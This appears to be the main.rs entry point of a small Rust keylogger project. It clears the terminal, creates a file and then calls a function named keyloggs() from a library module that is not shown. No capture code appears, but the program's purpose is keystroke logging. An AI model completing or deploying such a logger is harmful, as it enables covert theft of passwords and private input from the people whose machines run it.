mod lib;

fn main() {
    print!("\x1B[2J\x1B[1;1H");
    lib::create_file().expect("Something went wrong while creating the file!");
    lib::keyloggs();
}
